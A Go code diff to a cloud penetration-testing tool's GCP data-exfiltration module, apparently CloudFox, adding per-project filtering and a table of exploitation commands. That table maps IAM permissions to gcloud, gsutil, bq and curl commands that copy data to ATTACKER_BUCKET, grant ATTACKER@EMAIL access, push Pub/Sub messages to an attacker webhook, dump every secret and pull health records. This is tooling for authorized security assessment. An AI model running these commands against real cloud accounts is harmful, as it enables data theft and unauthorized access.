@@ -119,6 +119,7 @@ type DataExfiltrationModule struct {
 	vpcscProtectedProj       map[string]bool                 // Projects protected by VPC-SC
 	orgPolicyProtection      map[string]*OrgPolicyProtection // Org policy protections per project
 	FoxMapperCache           *gcpinternal.FoxMapperCache     // FoxMapper cache for unified data access
+	OrgCache                 *gcpinternal.OrgCache           // OrgCache for ancestry lookups
 }
 
 // ------------------------------
@@ -173,8 +174,68 @@ func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
 	return all
 }
 
+// filterFindingsByProjects filters FoxMapper findings to only include principals
+// from the specified projects (via -p or -l flags) OR principals without a clear project
+// (users, groups, compute default SAs, etc.)
+func (m *DataExfiltrationModule) filterFindingsByProjects(findings []foxmapperservice.DataExfilFinding) []foxmapperservice.DataExfilFinding {
+	// Build a set of specified project IDs for fast lookup
+	specifiedProjects := make(map[string]bool)
+	for _, projectID := range m.ProjectIDs {
+		specifiedProjects[projectID] = true
+	}
+
+	var filtered []foxmapperservice.DataExfilFinding
+
+	for _, finding := range findings {
+		// Filter principals to only those from specified projects OR without a clear project
+		var filteredPrincipals []foxmapperservice.PrincipalAccess
+		for _, p := range finding.Principals {
+			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+			// Include if:
+			// 1. Principal's project is in our specified list, OR
+			// 2. Principal has no clear project (users, groups, compute default SAs)
+			if specifiedProjects[principalProject] || principalProject == "" {
+				filteredPrincipals = append(filteredPrincipals, p)
+			}
+		}
+
+		// Only include the finding if it has matching principals
+		if len(filteredPrincipals) > 0 {
+			filteredFinding := finding
+			filteredFinding.Principals = filteredPrincipals
+			filtered = append(filtered, filteredFinding)
+		}
+	}
+
+	return filtered
+}
+
+// countFindingsByProject returns a count of findings per project for debugging
+func (m *DataExfiltrationModule) countFindingsByProject() map[string]int {
+	counts := make(map[string]int)
+	for _, f := range m.FoxMapperFindings {
+		for _, p := range f.Principals {
+			proj := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+			if proj == "" {
+				proj = "(unknown)"
+			}
+			counts[proj]++
+		}
+	}
+	return counts
+}
+
 func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
 	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)
+
+	// Load OrgCache for ancestry lookups (needed for per-project filtering)
+	m.OrgCache = gcpinternal.GetOrgCacheFromContext(ctx)
+	if m.OrgCache == nil || !m.OrgCache.IsPopulated() {
+		diskCache, _, err := gcpinternal.LoadOrgCacheFromFile(m.OutputDirectory, m.Account)
+		if err == nil && diskCache != nil && diskCache.IsPopulated() {
+			m.OrgCache = diskCache
+		}
+	}
 
 	// Get FoxMapper cache from context or try to load it
 	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)
@@ -200,9 +261,21 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 	if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
 		logger.InfoM("Analyzing permission-based exfiltration paths using FoxMapper...", GCP_DATAEXFILTRATION_MODULE_NAME)
 		svc := m.FoxMapperCache.GetService()
-		m.FoxMapperFindings = svc.AnalyzeDataExfil("")
+		allFindings := svc.AnalyzeDataExfil("")
+
+		// Filter findings to only include principals from specified projects
+		m.FoxMapperFindings = m.filterFindingsByProjects(allFindings)
+
 		if len(m.FoxMapperFindings) > 0 {
 			logger.InfoM(fmt.Sprintf("Found %d permission-based exfiltration techniques with access", len(m.FoxMapperFindings)), GCP_DATAEXFILTRATION_MODULE_NAME)
+
+			// Log findings per project for debugging
+			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+				counts := m.countFindingsByProject()
+				for proj, count := range counts {
+					logger.InfoM(fmt.Sprintf("  - %s: %d principals", proj, count), GCP_DATAEXFILTRATION_MODULE_NAME)
+				}
+			}
 		}
 	} else {
 		logger.InfoM("No FoxMapper data found - skipping permission-based analysis. Run 'foxmapper gcp graph create' for full analysis.", GCP_DATAEXFILTRATION_MODULE_NAME)
@@ -370,48 +443,215 @@ func (m *DataExfiltrationModule) initializeLootForProject(projectID string) {
 	}
 }
 
-func (m *DataExfiltrationModule) generatePlaybook() *internal.LootFile {
+// getExploitCommand returns specific exploitation commands for a permission
+func getExploitCommand(permission, principal, project string) string {
+	// Map permissions to specific gcloud/gsutil commands
+	commands := map[string]string{
+		// Storage
+		"storage.objects.get":           "gsutil cp gs://BUCKET/OBJECT ./\ngcloud storage cp gs://BUCKET/OBJECT ./",
+		"storage.objects.list":          "gsutil ls -r gs://BUCKET/\ngcloud storage ls --recursive gs://BUCKET/",
+		"storage.buckets.setIamPolicy":  "gsutil iam ch allUsers:objectViewer gs://BUCKET\n# Or grant yourself access:\ngsutil iam ch user:ATTACKER@EMAIL:objectAdmin gs://BUCKET",
+		"storage.hmacKeys.create":       "gsutil hmac create SERVICE_ACCOUNT_EMAIL",
+
+		// IAM / Service Account Impersonation
+		"iam.serviceAccounts.signBlob":      "gcloud iam service-accounts sign-blob --iam-account=TARGET_SA input.txt output.sig",
+		"iam.serviceAccountKeys.create":     "gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA",
+		"iam.serviceAccounts.getAccessToken": "gcloud auth print-access-token --impersonate-service-account=TARGET_SA",
+
+		// Storage Transfer
+		"storagetransfer.jobs.create": "# Create transfer job to exfil bucket to external destination\ngcloud transfer jobs create gs://SOURCE_BUCKET gs://ATTACKER_BUCKET --name=exfil-job",
+		"storagetransfer.jobs.update": "# Update existing transfer job destination\ngcloud transfer jobs update JOB_NAME --destination=gs://ATTACKER_BUCKET",
+		"storagetransfer.jobs.run":    "gcloud transfer jobs run JOB_NAME",
+
+		// BigQuery
+		"bigquery.tables.export":       "bq extract --destination_format=CSV PROJECT:DATASET.TABLE gs://BUCKET/export.csv",
+		"bigquery.tables.getData":      "bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT.DATASET.TABLE` LIMIT 1000'",
+		"bigquery.jobs.create":         "bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT.DATASET.TABLE`'\nbq extract PROJECT:DATASET.TABLE gs://BUCKET/export.csv",
+		"bigquery.datasets.setIamPolicy": "bq add-iam-policy-binding --member=user:ATTACKER@EMAIL --role=roles/bigquery.dataViewer PROJECT:DATASET",
+
+		// Cloud SQL
+		"cloudsql.instances.export":  "gcloud sql export sql INSTANCE gs://BUCKET/export.sql --database=DATABASE",
+		"cloudsql.backupRuns.create": "gcloud sql backups create --instance=INSTANCE",
+		"cloudsql.instances.connect": "gcloud sql connect INSTANCE --user=USER --database=DATABASE",
+		"cloudsql.users.create":      "gcloud sql users create ATTACKER --instance=INSTANCE --password=PASSWORD",
+
+		// Spanner
+		"spanner.databases.export": "gcloud spanner databases export DATABASE --instance=INSTANCE --destination-uri=gs://BUCKET/spanner-export/",
+		"spanner.databases.read":   "gcloud spanner databases execute-sql DATABASE --instance=INSTANCE --sql='SELECT * FROM TABLE_NAME'",
+		"spanner.backups.create":   "gcloud spanner backups create BACKUP --instance=INSTANCE --database=DATABASE --retention-period=7d",
+
+		// Datastore / Firestore
+		"datastore.databases.export": "gcloud datastore export gs://BUCKET/datastore-export/ --namespaces='(default)'",
+		"datastore.entities.get":     "gcloud datastore export gs://BUCKET/datastore-export/",
+
+		// Bigtable
+		"bigtable.tables.readRows": "cbt -project=PROJECT -instance=INSTANCE read TABLE",
+		"bigtable.backups.create":  "cbt -project=PROJECT -instance=INSTANCE createbackup CLUSTER BACKUP TABLE",
+
+		// Pub/Sub
+		"pubsub.subscriptions.create":  "gcloud pubsub subscriptions create ATTACKER_SUB --topic=TOPIC\ngcloud pubsub subscriptions pull ATTACKER_SUB --auto-ack --limit=100",
+		"pubsub.subscriptions.consume": "gcloud pubsub subscriptions pull SUBSCRIPTION --auto-ack --limit=100",
+		"pubsub.subscriptions.update":  "gcloud pubsub subscriptions update SUBSCRIPTION --push-endpoint=https://ATTACKER.COM/webhook",
+
+		// Compute
+		"compute.snapshots.create":     "gcloud compute snapshots create SNAPSHOT_NAME --source-disk=DISK_NAME --source-disk-zone=ZONE",
+		"compute.disks.createSnapshot": "gcloud compute disks snapshot DISK_NAME --zone=ZONE --snapshot-names=SNAPSHOT_NAME",
+		"compute.images.create":        "gcloud compute images create IMAGE_NAME --source-disk=DISK_NAME --source-disk-zone=ZONE",
+		"compute.machineImages.create": "gcloud compute machine-images create IMAGE_NAME --source-instance=INSTANCE --source-instance-zone=ZONE",
+		"compute.images.setIamPolicy":  "gcloud compute images add-iam-policy-binding IMAGE --member=user:ATTACKER@EMAIL --role=roles/compute.imageUser",
+		"compute.snapshots.setIamPolicy": "gcloud compute snapshots add-iam-policy-binding SNAPSHOT --member=user:ATTACKER@EMAIL --role=roles/compute.storageAdmin",
+
+		// Logging
+		"logging.sinks.create": "gcloud logging sinks create SINK_NAME storage.googleapis.com/ATTACKER_BUCKET --log-filter='resource.type=\"gce_instance\"'",
+		"logging.sinks.update": "gcloud logging sinks update SINK_NAME --destination=storage.googleapis.com/ATTACKER_BUCKET",
+		"logging.logEntries.list": "gcloud logging read 'resource.type=\"gce_instance\"' --limit=1000 --format=json > logs.json",
+
+		// Secret Manager
+		"secretmanager.versions.access": "gcloud secrets versions access latest --secret=SECRET_NAME",
+		"secretmanager.secrets.list":    "gcloud secrets list --format='value(name)'\n# Then access each secret:\nfor secret in $(gcloud secrets list --format='value(name)'); do gcloud secrets versions access latest --secret=$secret; done",
+
+		// KMS
+		"cloudkms.cryptoKeyVersions.useToDecrypt": "gcloud kms decrypt --key=KEY_NAME --keyring=KEYRING --location=LOCATION --ciphertext-file=encrypted.bin --plaintext-file=decrypted.txt",
+		"cloudkms.cryptoKeys.setIamPolicy":        "gcloud kms keys add-iam-policy-binding KEY_NAME --keyring=KEYRING --location=LOCATION --member=user:ATTACKER@EMAIL --role=roles/cloudkms.cryptoKeyDecrypter",
+
+		// Artifact Registry
+		"artifactregistry.repositories.downloadArtifacts": "gcloud artifacts docker images list LOCATION-docker.pkg.dev/PROJECT/REPO\ndocker pull LOCATION-docker.pkg.dev/PROJECT/REPO/IMAGE:TAG",
+		"artifactregistry.repositories.setIamPolicy":      "gcloud artifacts repositories add-iam-policy-binding REPO --location=LOCATION --member=user:ATTACKER@EMAIL --role=roles/artifactregistry.reader",
+
+		// Cloud Functions
+		"cloudfunctions.functions.get":           "gcloud functions describe FUNCTION_NAME --region=REGION",
+		"cloudfunctions.functions.sourceCodeGet": "gcloud functions describe FUNCTION_NAME --region=REGION --format='value(sourceArchiveUrl)'\ngsutil cp SOURCE_URL ./function-source.zip",
+
+		// Cloud Run
+		"run.services.get": "gcloud run services describe SERVICE --region=REGION --format=yaml",
+
+		// Dataproc
+		"dataproc.jobs.create": "gcloud dataproc jobs submit spark --cluster=CLUSTER --region=REGION --class=org.example.ExfilJob --jars=gs://ATTACKER_BUCKET/exfil.jar",
+
+		// Dataflow
+		"dataflow.jobs.create": "gcloud dataflow jobs run exfil-job --gcs-location=gs://dataflow-templates/latest/GCS_to_GCS --region=REGION --parameters inputDirectory=gs://SOURCE_BUCKET,outputDirectory=gs://ATTACKER_BUCKET",
+
+		// Redis
+		"redis.instances.export": "gcloud redis instances export gs://BUCKET/redis-export.rdb --instance=INSTANCE --region=REGION",
+
+		// AlloyDB
+		"alloydb.backups.create": "gcloud alloydb backups create BACKUP --cluster=CLUSTER --region=REGION",
+
+		// Source Repos
+		"source.repos.get": "gcloud source repos clone REPO_NAME\ncd REPO_NAME && git log --all",
+
+		// Healthcare API
+		"healthcare.fhirResources.get":            "curl -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://healthcare.googleapis.com/v1/projects/PROJECT/locations/LOCATION/datasets/DATASET/fhirStores/STORE/fhir/Patient\"",
+		"healthcare.dicomStores.dicomWebRetrieve": "curl -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://healthcare.googleapis.com/v1/projects/PROJECT/locations/LOCATION/datasets/DATASET/dicomStores/STORE/dicomWeb/studies\"",
+		"healthcare.datasets.export":              "gcloud healthcare datasets export DATASET --location=LOCATION --destination-uri=gs://BUCKET/healthcare-export/",
+	}
+
+	cmd, ok := commands[permission]
+	if !ok {
+		return fmt.Sprintf("# No specific command for %s - check gcloud documentation", permission)
+	}
+
+	// Replace placeholders with actual values where possible
+	if project != "" && project != "-" {
+		cmd = strings.ReplaceAll(cmd, "PROJECT", project)
+	}
+
+	return cmd
+}
+
+// generatePlaybookForProject generates a loot file specific to a project
+// It includes SAs from that project + users/groups (which apply to all projects)
+func (m *DataExfiltrationModule) generatePlaybookForProject(projectID string) *internal.LootFile {
 	var sb strings.Builder
-	sb.WriteString("# GCP Data Exfiltration Playbook\n")
+	sb.WriteString("# GCP Data Exfiltration Commands\n")
+	sb.WriteString(fmt.Sprintf("# Project: %s\n", projectID))
 	sb.WriteString("# Generated by CloudFox\n\n")
 
-	// Actual misconfigurations
-	allPaths := m.getAllExfiltrationPaths()
-	if len(allPaths) > 0 {
+	// Actual misconfigurations for this project
+	paths := m.ProjectExfiltrationPaths[projectID]
+	if len(paths) > 0 {
 		sb.WriteString("## Actual Misconfigurations\n\n")
-		for _, path := range allPaths {
+		for _, path := range paths {
 			sb.WriteString(fmt.Sprintf("### %s: %s\n", path.PathType, path.ResourceName))
-			sb.WriteString(fmt.Sprintf("- Project: %s\n", path.ProjectID))
-			sb.WriteString(fmt.Sprintf("- Risk Level: %s\n", path.RiskLevel))
-			sb.WriteString(fmt.Sprintf("- Description: %s\n", path.Description))
-			sb.WriteString(fmt.Sprintf("- Destination: %s\n\n", path.Destination))
+			sb.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
 			if path.ExploitCommand != "" {
-				sb.WriteString("```bash\n")
 				sb.WriteString(path.ExploitCommand)
-				sb.WriteString("\n```\n\n")
+				sb.WriteString("\n\n")
 			}
 		}
 	}
 
-	// Permission-based findings from FoxMapper
+	// Permission-based findings from FoxMapper - filter to this project's principals + users/groups
 	if len(m.FoxMapperFindings) > 0 {
-		sb.WriteString("## Permission-Based Exfiltration Techniques\n\n")
+		hasFindings := false
+
 		for _, finding := range m.FoxMapperFindings {
-			sb.WriteString(fmt.Sprintf("### %s (%s)\n", finding.Technique, finding.Service))
-			sb.WriteString(fmt.Sprintf("- Permission: %s\n", finding.Permission))
-			sb.WriteString(fmt.Sprintf("- Description: %s\n", finding.Description))
-			sb.WriteString(fmt.Sprintf("- Principals with access: %d\n\n", len(finding.Principals)))
-			if finding.Exploitation != "" {
-				sb.WriteString("```bash\n")
-				sb.WriteString(finding.Exploitation)
-				sb.WriteString("\n```\n\n")
+			var relevantPrincipals []foxmapperservice.PrincipalAccess
+
+			for _, p := range finding.Principals {
+				principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+				// Include if: SA from this project OR user/group (no project)
+				if principalProject == projectID || principalProject == "" {
+					relevantPrincipals = append(relevantPrincipals, p)
+				}
+			}
+
+			if len(relevantPrincipals) == 0 {
+				continue
+			}
+
+			if !hasFindings {
+				sb.WriteString("## Permission-Based Exfiltration Commands\n\n")
+				hasFindings = true
+			}
+
+			sb.WriteString(fmt.Sprintf("### %s (%s)\n", finding.Permission, finding.Service))
+			sb.WriteString(fmt.Sprintf("# %s\n\n", finding.Description))
+
+			for _, p := range relevantPrincipals {
+				project := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+				if project == "" {
+					project = projectID // Use the target project for users/groups
+				}
+
+				principalType := p.MemberType
+				if principalType == "" {
+					if p.IsServiceAccount {
+						principalType = "serviceAccount"
+					} else {
+						principalType = "user"
+					}
+				}
+
+				sb.WriteString(fmt.Sprintf("## %s (%s)\n", p.Principal, principalType))
+
+				// Add impersonation command if it's a service account
+				if p.IsServiceAccount {
+					sb.WriteString(fmt.Sprintf("# Impersonate first:\ngcloud config set auth/impersonate_service_account %s\n\n", p.Principal))
+				}
+
+				// Add the exploitation command
+				cmd := getExploitCommand(finding.Permission, p.Principal, project)
+				sb.WriteString(cmd)
+				sb.WriteString("\n\n")
+
+				// Reset impersonation note
+				if p.IsServiceAccount {
+					sb.WriteString("# Reset impersonation when done:\n# gcloud config unset auth/impersonate_service_account\n\n")
+				}
 			}
 		}
+	}
+
+	contents := sb.String()
+	// Don't return empty loot file
+	if contents == fmt.Sprintf("# GCP Data Exfiltration Commands\n# Project: %s\n# Generated by CloudFox\n\n", projectID) {
+		return nil
 	}
 
 	return &internal.LootFile{
-		Name:     "data-exfiltration-playbook",
-		Contents: sb.String(),
+		Name:     "data-exfiltration-commands",
+		Contents: contents,
 	}
 }
 
@@ -1041,11 +1281,13 @@ func (m *DataExfiltrationModule) getMisconfigHeader() []string {
 
 func (m *DataExfiltrationModule) getFoxMapperHeader() []string {
 	return []string{
-		"Technique",
+		"Scope Type",
+		"Scope ID",
+		"Principal Type",
+		"Principal",
 		"Service",
 		"Permission",
 		"Description",
-		"Principal Count",
 	}
 }
 
@@ -1094,18 +1336,220 @@ func (m *DataExfiltrationModule) pathsToTableBody(paths []ExfiltrationPath, expo
 	return body
 }
 
+// foxMapperFindingsForProject returns findings for a specific project
+// Includes: SAs from that project + users/groups (which can access any project)
+// Also filters by scope: only org/folder/project findings in the project's hierarchy
+func (m *DataExfiltrationModule) foxMapperFindingsForProject(projectID string) [][]string {
+	var body [][]string
+
+	// Get ancestor folders and org for filtering
+	var ancestorFolders []string
+	var projectOrgID string
+	if m.OrgCache != nil && m.OrgCache.IsPopulated() {
+		ancestorFolders = m.OrgCache.GetProjectAncestorFolders(projectID)
+		projectOrgID = m.OrgCache.GetProjectOrgID(projectID)
+	}
+	ancestorFolderSet := make(map[string]bool)
+	for _, f := range ancestorFolders {
+		ancestorFolderSet[f] = true
+	}
+
+	for _, f := range m.FoxMapperFindings {
+		for _, p := range f.Principals {
+			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+
+			// Include if: SA from this project OR user/group (no project - applies to all)
+			if principalProject != projectID && principalProject != "" {
+				continue
+			}
+
+			// Filter by scope hierarchy
+			if !m.scopeMatchesProject(p.ScopeType, p.ScopeID, projectID, projectOrgID, ancestorFolderSet) {
+				continue
+			}
+
+			// Determine principal type
+			principalType := p.MemberType
+			if principalType == "" {
+				if p.IsServiceAccount {
+					principalType = "serviceAccount"
+				} else {
+					principalType = "user"
+				}
+			}
+
+			scopeType := p.ScopeType
+			if scopeType == "" {
+				scopeType = "-"
+			}
+			scopeID := p.ScopeID
+			if scopeID == "" {
+				scopeID = "-"
+			}
+
+			body = append(body, []string{
+				scopeType,
+				scopeID,
+				principalType,
+				p.Principal,
+				f.Service,
+				f.Permission,
+				f.Description,
+			})
+		}
+	}
+	return body
+}
+
+// foxMapperFindingsWithoutProject returns findings for principals without a clear project
+// (e.g., compute default SAs, users, groups)
+func (m *DataExfiltrationModule) foxMapperFindingsWithoutProject() [][]string {
+	var body [][]string
+	for _, f := range m.FoxMapperFindings {
+		for _, p := range f.Principals {
+			// Extract project from principal
+			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+
+			// Only include if we couldn't determine the project
+			if principalProject != "" {
+				continue
+			}
+
+			// Determine principal type
+			principalType := p.MemberType
+			if principalType == "" {
+				if p.IsServiceAccount {
+					principalType = "serviceAccount"
+				} else {
+					principalType = "user"
+				}
+			}
+
+			scopeType := p.ScopeType
+			if scopeType == "" {
+				scopeType = "-"
+			}
+			scopeID := p.ScopeID
+			if scopeID == "" {
+				scopeID = "-"
+			}
+
+			body = append(body, []string{
+				scopeType,
+				scopeID,
+				principalType,
+				p.Principal,
+				f.Service,
+				f.Permission,
+				f.Description,
+			})
+		}
+	}
+	return body
+}
+
+// foxMapperFindingsToTableBodyForProject returns findings filtered by project
+func (m *DataExfiltrationModule) foxMapperFindingsToTableBodyForProject(projectID string) [][]string {
+	var body [][]string
+	for _, f := range m.FoxMapperFindings {
+		for _, p := range f.Principals {
+			// Extract project from principal (uses existing function from privesc.go)
+			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
+
+			// Only include if it matches this project
+			if principalProject != projectID {
+				continue
+			}
+
+			// Determine principal type
+			principalType := p.MemberType
+			if principalType == "" {
+				if p.IsServiceAccount {
+					principalType = "serviceAccount"
+				} else {
+					principalType = "user"
+				}
+			}
+
+			body = append(body, []string{
+				principalProject,
+				principalType,
+				p.Principal,
+				f.Service,
+				f.Permission,
+				f.Description,
+			})
+		}
+	}
+	return body
+}
+
+// foxMapperFindingsToTableBody returns all findings (for flat output)
 func (m *DataExfiltrationModule) foxMapperFindingsToTableBody() [][]string {
 	var body [][]string
 	for _, f := range m.FoxMapperFindings {
-		body = append(body, []string{
-			f.Technique,
-			f.Service,
-			f.Permission,
-			f.Description,
-			fmt.Sprintf("%d", len(f.Principals)),
-		})
+		for _, p := range f.Principals {
+			// Determine principal type
+			principalType := p.MemberType
+			if principalType == "" {
+				if p.IsServiceAccount {
+					principalType = "serviceAccount"
+				} else {
+					principalType = "user"
+				}
+			}
+
+			scopeType := p.ScopeType
+			if scopeType == "" {
+				scopeType = "-"
+			}
+			scopeID := p.ScopeID
+			if scopeID == "" {
+				scopeID = "-"
+			}
+
+			body = append(body, []string{
+				scopeType,
+				scopeID,
+				principalType,
+				p.Principal,
+				f.Service,
+				f.Permission,
+				f.Description,
+			})
+		}
 	}
 	return body
+}
+
+// scopeMatchesProject checks if a scope (org/folder/project) is in the hierarchy for a project
+func (m *DataExfiltrationModule) scopeMatchesProject(scopeType, scopeID, projectID, projectOrgID string, ancestorFolderSet map[string]bool) bool {
+	if scopeType == "" || scopeID == "" {
+		// No scope info - include by default
+		return true
+	}
+
+	switch scopeType {
+	case "project":
+		return scopeID == projectID
+	case "organization":
+		if projectOrgID != "" {
+			return scopeID == projectOrgID
+		}
+		// No org info - include by default
+		return true
+	case "folder":
+		if len(ancestorFolderSet) > 0 {
+			return ancestorFolderSet[scopeID]
+		}
+		// No folder info - include by default
+		return true
+	case "resource":
+		// Resource-level - include by default
+		return true
+	default:
+		return true
+	}
 }
 
 func (m *DataExfiltrationModule) buildTablesForProject(projectID string) []internal.TableFile {
@@ -1131,25 +1575,28 @@ func (m *DataExfiltrationModule) buildTablesForProject(projectID string) []inter
 func (m *DataExfiltrationModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
 	outputData := internal.HierarchicalOutputData{
 		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
+		FolderLevelData:  make(map[string]internal.CloudfoxOutput),
 		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
 	}
 
-	projectIDs := make(map[string]bool)
-	for projectID := range m.ProjectExfiltrationPaths {
-		projectIDs[projectID] = true
-	}
-	for projectID := range m.ProjectPublicExports {
-		projectIDs[projectID] = true
-	}
-
-	playbook := m.generatePlaybook()
-	playbookAdded := false
-
-	for projectID := range projectIDs {
+	// Process each specified project (via -p or -l flags)
+	for _, projectID := range m.ProjectIDs {
 		m.initializeLootForProject(projectID)
 
 		tableFiles := m.buildTablesForProject(projectID)
 
+		// Add FoxMapper findings table for this project
+		// Include SAs from this project + users/groups (which apply to all projects)
+		foxMapperBody := m.foxMapperFindingsForProject(projectID)
+		if len(foxMapperBody) > 0 {
+			tableFiles = append(tableFiles, internal.TableFile{
+				Name:   "data-exfiltration-permissions",
+				Header: m.getFoxMapperHeader(),
+				Body:   foxMapperBody,
+			})
+		}
+
+		// Add loot files for this project
 		var lootFiles []internal.LootFile
 		if projectLoot, ok := m.LootMap[projectID]; ok {
 			for _, loot := range projectLoot {
@@ -1159,26 +1606,14 @@ func (m *DataExfiltrationModule) writeHierarchicalOutput(ctx context.Context, lo
 			}
 		}
 
-		if playbook != nil && playbook.Contents != "" && !playbookAdded {
+		// Add project-specific playbook
+		playbook := m.generatePlaybookForProject(projectID)
+		if playbook != nil && playbook.Contents != "" {
 			lootFiles = append(lootFiles, *playbook)
-			playbookAdded = true
 		}
 
+		// Always add all specified projects to output
 		outputData.ProjectLevelData[projectID] = DataExfiltrationOutput{Table: tableFiles, Loot: lootFiles}
-	}
-
-	// Add FoxMapper findings table at first project level if exists
-	if len(m.FoxMapperFindings) > 0 && len(m.ProjectIDs) > 0 {
-		firstProject := m.ProjectIDs[0]
-		if existing, ok := outputData.ProjectLevelData[firstProject]; ok {
-			existingOutput := existing.(DataExfiltrationOutput)
-			existingOutput.Table = append(existingOutput.Table, internal.TableFile{
-				Name:   "data-exfiltration-permissions",
-				Header: m.getFoxMapperHeader(),
-				Body:   m.foxMapperFindingsToTableBody(),
-			})
-			outputData.ProjectLevelData[firstProject] = existingOutput
-		}
 	}
 
 	pathBuilder := m.BuildPathBuilder()
@@ -1225,9 +1660,14 @@ func (m *DataExfiltrationModule) writeFlatOutput(ctx context.Context, logger int
 		}
 	}
 
-	playbook := m.generatePlaybook()
-	if playbook != nil && playbook.Contents != "" {
-		lootFiles = append(lootFiles, *playbook)
+	// For flat output, generate a combined playbook for all projects
+	for _, projectID := range m.ProjectIDs {
+		playbook := m.generatePlaybookForProject(projectID)
+		if playbook != nil && playbook.Contents != "" {
+			// Rename to include project
+			playbook.Name = fmt.Sprintf("data-exfiltration-commands-%s", projectID)
+			lootFiles = append(lootFiles, *playbook)
+		}
 	}
 
 	output := DataExfiltrationOutput{
